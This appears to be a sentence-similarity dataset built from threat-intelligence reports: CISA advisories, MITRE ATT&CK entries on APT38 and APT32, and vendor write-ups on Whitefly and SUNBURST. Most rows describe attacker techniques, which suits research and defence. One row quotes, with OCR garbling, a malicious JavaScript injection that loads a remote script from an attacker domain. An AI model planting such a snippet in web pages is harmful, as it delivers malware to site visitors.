hash|phrase|similarity|adjacent_sentences
4205237,1994129,724664,453750,274299,1956688,4428095,527077,1554397,210700,970034,68866,3183692,1457497,1886773,3257661,31430,318355,2376874,2174876,1887686,331496,2020632,233575,99582,1832210,1324353,1251448,2636232,1185873,3901026,1740603,2610210,528225,636307,2926056,1495963,904925,199244,1341852,1040025,447996,1223536,1120881,3538355,161877,40836,1300803,61146,1431792,669973,707267,3231374,2006673,944721,1166550,1061164,1266990,4241899,1502830,1235269,73469,171273,2375699,745699,1431559,2839721,313465,1169998,317735,220738,221891,2036564,1839938,458503,250701,5543102,6497,1008115,430228,3265971,99339,2171615,281226,604504,3417687,2393729,2738404,134600,1020813,1185904,2848563,1278729,471631,315309,1520345,908374,282804,2427952,1307595,2278521,762471,276700,2641584,40464,1543963,751071,99727,6554502,914881,2212147,1803642,1754978,71,4239,162911,51404,802429,370600,989728,806051,2485405,1622103,3030832,333147,776890,432061,62944|An adversary may compress and/or encrypt data that is collected prior to exfiltration.|0.8166324374517832|"['Exploit Public-Facing Adversaries may attempt to exploit a weakness in an Internet- T1190 Application facing host or system to initially access a network.', 'Page 45 of 48 | Product ID: AA23-129A TLP:CLEARTLP:CLEAR International Partnership Adversaries may attempt to gather information on domain trust Domain Trust Discovery T1482 relationships that may be used to identify lateral movement opportunities in Windows multi-domain/forest environments.', 'Adversaries may establish persistence and elevate privileges by Installer Packages T1546.016 using an installer to trigger the execution of malicious content.', 'Adversaries may execute their own malicious payloads by Dynamic Linker Hijacking T1547.006 hijacking environment variables the dynamic linker uses to load shared libraries.', 'Inter-Process Adversaries may abuse inter-process communication (IPC) T1559 Communication mechanisms for local code or command execution.', 'An adversary may compress and/or encrypt data that is collected Archive Collected Data T1560.003 prior to exfiltration.', 'Adversaries may attempt to hide artifacts associated with their Hide Artifacts T1564 behaviors to evade detection.', 'Adversaries may abuse the Windows service control manager to Service Execution T1569.002 execute malicious commands or payloads.', 'Adversaries may transfer tools or other files between systems in Lateral Tool Transfer T1570 a compromised environment.', 'Adversaries may tunnel network communications to and from a victim system within a separate protocol to avoid Protocol Tunneling T1572 detection/network filtering and/or enable access to otherwise unreachable systems.', 'Adversaries may employ a known encryption algorithm to conceal Encrypted Channel T1573 command and control traffic rather than relying on any inherent protections provided by a communication protocol.']"
4205237,1994129,724664,453750,274299,1956688,4428095,527077,1554397,210700,970034,68866,3183692,1457497,1886773,3257661,31430,318355,2376874,2174876,1887686,331496,2020632,233575,99582,1832210,1324353,1251448,2636232,1185873,3901026,1740603,2610210,528225,636307,2926056,1495963,904925,199244,1341852,1040025,447996,1223536,1120881,3538355,161877,40836,1300803,61146,1431792,669973,707267,3231374,2006673,944721,1166550,1061164,1266990,4241899,1502830,1235269,73469,171273,2375699,745699,1431559,2839721,313465,1169998,317735,220738,221891,2036564,1839938,458503,250701,5543102,6497,1008115,430228,3265971,99339,2171615,281226,604504,3417687,2393729,2738404,134600,1020813,1185904,2848563,1278729,471631,315309,1520345,908374,282804,2427952,1307595,2278521,762471,276700,2641584,40464,1543963,751071,99727,6554502,914881,2212147,1803642,1754978,71,4239,162911,51404,802429,370600,989728,806051,2485405,1622103,3030832,333147,776890,432061,62944|Once established within a system or network, an adversary may use automated techniques for collecting internal data.|0.8605675290658924|['To disguise the source of malicious traffic, adversaries may chain Multi-hop Proxy T1090.003 together multiple proxies.', 'Adversaries may use an OSI non-application layer protocol for Non-Application Layer T1095 communication between host and C2 server or among infected Protocol hosts within a network.', 'Adversaries may create multiple stages for command and control Multi-Stage Channels T1104 that are employed under different conditions or for certain functions.', 'Adversaries may interact with the native OS application Native API T1106 programming interface (API) to execute behaviors.', 'Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove Modify Registry T1112 information as part of cleaning up, or as part of other techniques to aid in persistence and execution.', 'Once established within a system or network, an adversary may Automated Collection T1119 use automated techniques for collecting internal data.', 'Adversaries may encode data to make the content of command Data Encoding T1132 and control traffic more difficult to detect.', 'Adversaries may encode data with a non-standard data encoding Non-Standard Encoding T1132.002 system to make the content of command and control traffic more difficult to detect.', 'Adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to Network Share Discovery T1135 gather as a precursor for Collection and to identify potential systems of interest for Lateral Movement.', 'Deobfuscate/Decode Files Adversaries may use Obfuscated Files or Information to hide T1140 or Information artifacts of an intrusion from analysis.', 'Exploit Public-Facing Adversaries may attempt to exploit a weakness in an Internet- T1190 Application facing host or system to initially access a network.']
20355458,1992517,9024081,11313457,1259187,7829423,32799767,24077093,10666186,2305997,1538528,12608472,8951573,6129716,12400397,13566609,26343942,1607720,4104242,11100931,6503970,8240817,2457974,16439853,8656235,1898719,16674892,13528392,33120409,9811063,10058780,13734945,16182449,6917515,12399126,14592050,1441574,1414904,4623178,8780955,2254750,4412375,6557557,10231917,5308609,5564078,3845291,2393782,69799846,2414303,52262098,10030682,1878297,10924517,5711894,13802806,27846463,19451762,11163758,32460033,1235269,8879159,5348955,3549008,18108713,19596352,3148072,12512447,9053999,4479256,22688813,30344965,20386799,14664792,7370351,35801627,16678897,25792704,15507029,3407996,2637888,28654178,9251187,3967045,6988186,9787797,11817792,8502036,25998451,17038871,13926909,12176209,5784398,10463475,15727200,587604,1073040,3131165,13110429,9350717,1888483,4680793,276700,3438685,22069770,1543963,39366018,1634069,2583523,18875456,8198026,1192114,1250663,7233443,3875981,1136016,8289124,1529333,11621072,7755034,2789300,4416646,5232918,478807,14665865,3741083,9794231,3188038|APT38 has collected browser bookmark information to learn more about compromised hosts, obtain personal information about users, and acquire details about internal network resources.|0.8066530274749938|['EnterpriseT1071.001Application Layer Protocol:Web ProtocolsAPT38used a backdoor, QUICKRIDE, to communicate to the C2 server over HTTP and HTTPS.', '[2]EnterpriseT1217Browser Information DiscoveryAPT38has collected browser bookmark information to learn more about compromised hosts, obtain personal information about users, and acquire details about internal network resources.', '[1]EnterpriseT1110Brute ForceAPT38has used brute force techniques to attempt account access when passwords are unknown or when password hashes are unavailable.', '[1]EnterpriseT1115Clipboard DataAPT38used a Trojan called KEYLIME to collect data from the clipboard.', '[2]EnterpriseT1059.001Command and Scripting Interpreter:PowerShellAPT38has used PowerShell to execute commands and other operational tasks.', '[1].003Command and Scripting Interpreter:Windows Command ShellAPT38has used a command-line tunneler, NACHOCHEESE, to give them shell access to a victims machine.', '[2].005Command and Scripting Interpreter:Visual BasicAPT38has used VBScript to execute commands and other operational tasks.']
1420552,1475812,388584,453750,904197,516604,775597,128961,3164823,645411,760734,122469,1254571,128441,745238,1368851,293111,304913,387799,153215,425930,22877,97271,233575,774320,451836,1271261,143192,606066,781666,1799977,42426,546566,528225,450747,386199,3195,185762,484918,913964,1678590,14261,676714,74442,1523739,42085,140586,459578,61146,1975166,114528,649515,1345701,1044045,358757,557991,134491,2909287,118940,905943,898703,764685,171273,485589,745699,95207,12232,2119763,1169998,193085,86224,221891,1721996,196565,962199,539955,687837,442481,249221,430228,48349,99339,188841,223035,203993,730286,54068,42897,1551698,1586059,85141,375183,1278729,35900,315309,656317,478882,282804,309737,1175856,526199,261086,276700,28107,40464,854693,579563,1120053,1047897,914881,1115400,880597,1250663,933690,255017,162911,51404,1291450,694672,989728,98344,82201,940479,1233161,333147,518234,432061,62944|Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries.|0.843561094732999|['Since multiple techniques can be mapped to any confirmed threat, the percentages below add up to more than 100 percent.', 'T1059 Command 1 24% of total threats and Scripting Interpreter T1218 Signed Binary 2 19% Process Execution T1543 Create and 3 16% Modify System Process 4 16% T1053 Scheduled Task / Job 5 7% T1003 OS Credential Dumping 6 7% T1055 Process Injection T1027 Obfuscated Files 7 6% or Information 8 5% T1105 Ingress Tool Transfer 9 4% T1569 System Services 10 4% T1036 Masquerading l 10 Top Techniques2021 Threat Detection Report TECHNIQUE T1059 Command and #1 Scripting Interpreter OVERALL RANK Command and Scripting Interpreter tops our list this year thanks in large part to detections associated with two of its sub-techniques: PowerShell and Windows Command Shell.', '72.2% ORGANIZATIONS AFFECTED T1059.001 PowerShell 48.7% 2,366 4,798 ORGANIZATIONS AFFECTED CONFIRMED THREATS PowerShell was the most common technique we observed in 2020, CONFIRMED THREATS affecting nearly half of our customers.', 'It remains among the most versatile of built-in utilities for adversaries, defenders, and system administrators alike.', 'SEE MORE > T1059.003 Windows Command Shell 38.4% 1,984 ORGANIZATIONS AFFECTED CONFIRMED THREATS While it doesnt do much on its own, Windows Command Shell can call on virtually any executable on the system to execute batch files and arbitrary tasks.', 'SEE MORE > T1059: COMMAND AND SCRIPTING Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries.', 'These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms.', 'Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of Unix Shell while Windows installations include the Windows Command Shell and PowerShell.', '11 SEUQINHCET-BUS TNELAVERP l 11 T1059: Command and Scripting Interpreter2021 Threat Detection Report TECHNIQUE T1059.001 PowerShell #1 PowerShell was the most common technique we observed in 2020, affecting PARENT TECHNIQUE RANK nearly half of our customers.', 'It remains among the most versatile of built-in utilities for adversaries, defenders, and system administrators alike.', '48.7% Analysis ORGANIZATIONS AFFECTED Why do adversaries use PowerShell?']
2042798,1994129,109812,453750,54485,11245,1089599,527077,373664,210700,555110,68463,799133,662379,175535,198035,257259,304913,342752,350526,425930,94707,747922,203546,1830157,42713,1156155,901212,521743,781666,703195,533016,56833,75267,450747,2448595,400841,185762,53237,653349,111963,447996,1572129,74442,622628,161877,140586,87397,563183,583171,90456,649515,1794673,1852535,169066,248402,1244478,395549,150572,1072244,1104034,432082,171273,187822,662560,1434057,12232,313465,383026,193085,1316220,1666,592084,625475,18388,328739,687837,340310,535131,334294,829,99339,135117,281226,124763,923999,848242,42897,548531,76262,328965,140379,956223,114286,20322,963472,724546,282804,310578,3187139,191790,1851561,52722,28107,40464,157232,626106,99727,1047897,914881,2045474,1061732,72167,933690,70822,162911,1472991,1529333,666552,989728,98344,169735,1861663,349447,333147,274588,526316,62944|Lsadump also includes NetSync, which performs DCSync over a legacy replication protocol.|0.8443091975211341|"['If the browser version contains a vulnerability, corresponding exploitation code gets run on the target system, potentially giving the attacker a remote code execution ability.', 'For these types of attacks, adversaries often leverage JavaScript.', 'For instance, according to a malware analysis report performed by Palo Alto, analyzing threat samples from April 2022 to June 2022, among all of the web threats detected during the research, JavaScript downloaders and redirectors were in the top 5 most leveraged web threats, infecting around 300 different domains [31].', 'Analysis shows that attackers often inject malicious JavaScript downloaders to a webpage owned by them, creating several new script elements that redirect website visitors to ads, spams, or any other malicious domains such as train[.]developfirstline[.', ']com: .', '.', '.', 'Element.prototype.appendAfter = function(element) { element.parentNode.insertBefore(this, element.nextSibling) ), false(function () { var elem = document.createElement(\'script"") elem.type = \'text / javascript\' elem.sc = \'https://train.developfirstline.com/delivery.js?s=3\' elem.appendAfter(document.getElementsByTagName(\'script\')(0]) elem.appendAfter(document.getElementsByTagName(""\'head\')[0]) document.getElementsByTagName(\'head\')(01.appendChild(elem) .', '.', '.', '37#1.8.']"
2580654,22529708,9024081,453750,15213372,7829423,4801307,2518433,1898728,29850607,3912752,6951828,8799657,12265261,51801318,4605955,293111,963568,3541813,21794351,1887686,17510753,2457974,3627505,9268885,1631352,1324353,12446119,5869345,86363,3901026,1002302,5266443,10967976,2346685,15893949,21636081,1373843,24655480,2472168,8922706,7658704,1843227,1120881,1682938,5564078,1771774,2393782,3462751,18891594,19930742,10030682,12463154,5489376,358757,5334374,6760023,1741420,3227394,727803,10323125,5899465,18193219,5303226,758187,5748040,22249452,5224622,13933753,11128502,19021482,2579604,4286791,215436,881097,10901896,3229885,9226336,12770139,1081391,5100988,629887,16588591,24958502,8841244,4613699,6180455,40892670,16187715,5780008,4822408,2933573,8116193,8368712,5612377,5229812,2283994,5813269,3522355,2216773,14909610,5209356,5926598,1199104,14080834,2925,14934828,3824292,12215481,914881,3801879,2688546,1957091,4938703,15880343,801913,4285659,1529333,3820661,989728,7805551,736384,3735512,2626072,1331228,4623602,8525381,7942710|Whitefly has used search order hijacking to run the loader Vcrodat.|0.8332628157610411|"['To date, Whitefly has attacked organizations in the healthcare, media, telecommunications, and engineering sectors.', 'How Whitefly compromises its victims https://www.symantec.com/blogs/threat-intelligence/whitefly-espionage-singapore 1/43/7/2019 Whitefly: Espionage Group has Singapore in Its Sights | Symantec Blogs Whitefly first infects its victims using a dropper in the form of a malicious .exe or .dll file that is disguised as a document or image.', 'These files frequently purport to offer information on job openings or appear to be documents sent from another organization operating in the same industry as the victim.', 'Given the nature of disguise, its highly likely that they are sent to the victim using spear-phishing emails.', 'If opened, the dropper runs a loader known as Trojan.Vcrodat on the computer.', 'Whitefly has consistently used a technique known as search order hijacking to run Vcrodat.', 'This technique takes advantage of the fact that Windows does not require an application to provide a specific path for a DLL that it wishes to load.', 'If no path is provided, Windows searches for the DLL in specific locations on the computer in a pre-defined order.', 'Attackers can therefore give a malicious DLL the same name as a legitimate DLL but place it ahead of the legitimate version in the search order so that it will be loaded when Windows searches for it.', 'Whitefly frequently delivers Vcrodat as a malicious DLL that has the same name as DLLs belonging to legitimate software from various security vendors.', 'The group leverages search order hijacking to assure that its malicious DLLs will be executed.']"
16236072,5226160,7034219,1489418,1526616,7829423,5481880,4995002,8377691,13242532,1505786,33618458,3183692,6129716,1886773,4605955,15849823,1934786,2791802,477735,1887686,7748751,3155186,7093874,3610172,1263174,16674892,7617339,5869345,3280190,3901026,18080097,6731126,4486055,5602630,13735788,1245632,1414904,3585627,6262704,2254750,7541552,5945161,10036306,11892694,967570,140586,1300803,61146,2414303,2767988,4965337,10970,10924517,3485855,268499,1321465,4780987,4241899,10674892,1235269,37729943,3740058,3549008,30342613,103219,7195574,2833349,1169998,6679839,7546726,2641593,10258276,6787830,12166423,10901896,7332799,505821,33366295,1081391,14601617,1259244,2585331,3459705,5734616,7342562,139616,6238428,2951369,13915509,3184263,467047,8702321,4113582,315309,20471769,1073040,9458164,3646025,9350717,10859234,7047935,276700,1199104,5910747,4696912,736867,12455278,17842890,10495532,3571177,1192114,1957091,3651569,10253493,4338745,3207842,1529333,3526366,3895584,7805551,4416646,5232918,478807,7276984,17986923,7918453,4650276|The group also side-loads its backdoor by dropping a library and a legitimate, signed executable .|0.8132535000509582|"['[6].002Email AddressesAPT32has collected e-mail addresses for activists and bloggers in order to target them with spyware.', ""[6]EnterpriseT1564.001Hide Artifacts:Hidden Files and DirectoriesAPT32's macOS backdoor hides the clientID file via a chflags function."", '[10].003Hide Artifacts:Hidden WindowAPT32has used the WindowStyle parameter to concealPowerShellwindows.', '[1][8].004Hide Artifacts:NTFS File AttributesAPT32used NTFS alternate data streams to hide their payloads.', '[8]EnterpriseT1574.002Hijack Execution Flow:DLL Side-LoadingAPT32ran legitimately-signed executables from Symantec and McAfee which load a malicious DLL.', 'The group also side-loads its backdoor by dropping a library and a legitimate, signed executable (AcroTranscoder).', '[4][8][5]EnterpriseT1070.001Indicator Removal:Clear Windows Event LogsAPT32has cleared select event log entries.', '[1].004Indicator Removal:File DeletionAPT32\'s macOS backdoor can receive a ""delete"" command.', '[10].006Indicator Removal:TimestompAPT32has used scheduled task raw XML with a backdated timestamp of June 2, 2016.', 'The group has also set the creation time of the files dropped by the second stage of the exploit to match the creation time of kernel32.dll.', 'Additionally,APT32has used a random value to modify the timestamp of the file storing the clientID.']"
2105016,2102506,154190,453750,3453873,11245,12389491,1229895,2709365,4590772,3433743,5992398,3183692,12265261,1886773,12231987,2059713,304913,2376874,2174876,1549220,1032360,193688,6522511,2149817,1832210,1271261,8874972,8717402,780017,3901026,804298,5909220,912180,700550,2926056,406662,1404060,2123728,4172410,5396760,7541552,1572129,74442,3486019,5564078,897695,1300803,61146,2378703,2018402,649515,1827125,7303748,358757,1166550,6180301,4726271,9355837,419250,1235269,2652027,11447161,5179479,745699,95207,12232,3446680,1169998,52373,86224,712433,4618377,2728624,2075527,539955,687837,2381307,8442958,1081391,3069754,6468713,7402094,2818649,4223134,2891313,2075242,2738404,1064084,1450932,1357031,1989433,2304875,2809884,315309,4087478,1073040,9458164,3814559,1307595,2278521,2231182,167155,2842731,595253,1543963,751071,99727,3200673,151715,3894530,3000515,1153379,1875882,927209,2273975,4778538,1529333,1536601,989728,2789300,2485405,4000571,2626144,333147,1731370,7918453,3311636|SUNBURST used DNS for C2 traffic designed to mimic normal SolarWinds API communications.|0.778948725266449|['1/9Figure 1: SolarWinds digital signature on software with backdoor Multiple trojanzied updates were digitally signed from March - May 2020 and posted to the SolarWinds updates website, including: hxxps://downloads.solarwinds[.', ']com/solarwinds/CatalogResources/Core/2019.4/2019.4.5220.20574/SolarWinds- Core-v2019.4.5220-Hotfix5.msp The trojanized update file is a standard Windows Installer Patch file that includes compressed resources associated with the update, including the trojanized SolarWinds.Orion.Core.BusinessLayer.dll component.', 'Once the update is installed, the malicious DLL will be loaded by the legitimate SolarWinds.BusinessLayerHost.exe or SolarWinds.BusinessLayerHostx64.exe (depending on system configuration).', 'After a dormant period of up to two weeks, the malware will attempt to resolve a subdomain of avsvmcloud[.]com.', 'The DNS response will return a CNAME record that points to a Command and Control (C2) domain.', 'The C2 traffic to the malicious domains is designed to mimic normal SolarWinds API communications.', 'The list of known malicious infrastructure is available on FireEyes GitHub page.', 'Worldwide Victims Across Multiple Verticals FireEye has detected this activity at multiple entities worldwide.', 'The victims have included government, consulting, technology, telecom and extractive entities in North America, Europe, Asia and the Middle East.', 'We anticipate there are additional victims in other countries and verticals.', 'FireEye has notified all entities we are aware of being affected.']
4205237,1994129,724664,453750,274299,1956688,4428095,527077,1554397,210700,970034,68866,3183692,1457497,1886773,3257661,31430,318355,2376874,2174876,1887686,331496,2020632,233575,99582,1832210,1324353,1251448,2636232,1185873,3901026,1740603,2610210,528225,636307,2926056,1495963,904925,199244,1341852,1040025,447996,1223536,1120881,3538355,161877,40836,1300803,61146,1431792,669973,707267,3231374,2006673,944721,1166550,1061164,1266990,4241899,1502830,1235269,73469,171273,2375699,745699,1431559,2839721,313465,1169998,317735,220738,221891,2036564,1839938,458503,250701,5543102,6497,1008115,430228,3265971,99339,2171615,281226,604504,3417687,2393729,2738404,134600,1020813,1185904,2848563,1278729,471631,315309,1520345,908374,282804,2427952,1307595,2278521,762471,276700,2641584,40464,1543963,751071,99727,6554502,914881,2212147,1803642,1754978,71,4239,162911,51404,802429,370600,989728,806051,2485405,1622103,3030832,333147,776890,432061,62944|Adversaries may encode data to make the content of command and control traffic more difficult to detect.|0.8598647414193625|"['Adversaries may use an OSI non-application layer protocol for Non-Application Layer T1095 communication between host and C2 server or among infected Protocol hosts within a network.', 'Adversaries may create multiple stages for command and control Multi-Stage Channels T1104 that are employed under different conditions or for certain functions.', 'Adversaries may interact with the native OS application Native API T1106 programming interface (API) to execute behaviors.', 'Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove Modify Registry T1112 information as part of cleaning up, or as part of other techniques to aid in persistence and execution.', 'Once established within a system or network, an adversary may Automated Collection T1119 use automated techniques for collecting internal data.', 'Adversaries may encode data to make the content of command Data Encoding T1132 and control traffic more difficult to detect.', 'Adversaries may encode data with a non-standard data encoding Non-Standard Encoding T1132.002 system to make the content of command and control traffic more difficult to detect.', 'Adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to Network Share Discovery T1135 gather as a precursor for Collection and to identify potential systems of interest for Lateral Movement.', 'Deobfuscate/Decode Files Adversaries may use Obfuscated Files or Information to hide T1140 or Information artifacts of an intrusion from analysis.', 'Exploit Public-Facing Adversaries may attempt to exploit a weakness in an Internet- T1190 Application facing host or system to initially access a network.', 'Page 45 of 48 | Product ID: AA23-129A TLP:CLEARTLP:CLEAR International Partnership Adversaries may attempt to gather information on domain trust Domain Trust Discovery T1482 relationships that may be used to identify lateral movement opportunities in Windows multi-domain/forest environments.']"
4205237,2248874,2507878,453750,9930512,3313211,245546,527077,5863279,525118,1538528,1616244,5429771,4306238,175535,4605955,1902039,1320109,1172397,289064,204171,1165143,6781773,1624185,99582,884489,159127,11608,7095990,209820,703195,238772,546566,1782654,4998811,6760715,1590338,1758872,2025582,445374,5403292,14261,1072596,718171,536266,5564078,140586,459578,61146,5043500,101233,5742020,40935,3903008,944721,557991,2139499,6044690,839951,3634412,1235269,2157945,1073414,748785,3327763,4894924,12232,925576,1084503,7992236,1376790,768679,2585693,2784246,1871048,5443450,687837,196508,1008115,1081391,5100988,99339,2772928,2818649,4667868,1518556,3359304,879758,4671402,1076850,1357031,1082883,1358216,4034482,315309,693543,2837940,282804,310578,1307595,2278521,1924453,276700,6438276,1165178,1543963,1368770,99727,1964548,1381407,2212147,1803642,1250663,71,4239,2273975,264904,1529333,1536601,989728,2082544,1879656,2925602,4842699,947760,1528994,15372,62944|Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities.|0.7921129789397879|"['Configure authentication mechanisms to confirm certain user activities on systems, including registering new devices.', ""Page 22 of 27 | Product ID: AA23-347A TLP:CLEARTLP:CLEAR International Partnership VALIDATE SECURITY CONTROLS In addition to applying mitigations, FBI, CISA, NSA, SKW, CERT Polska, and NCSC recommend exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory."", 'FBI, CISA, NSA, SKW, CERT Polska, and NCSC recommend testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory.', 'To get started: 1.', 'Select an ATT&CK technique described in this advisory (see previous tables).', '2.', 'Align your security technologies against the technique.', '3.', 'Test your technologies against the technique.', '4.', 'Analyze your detection and prevention technologies performance.']"
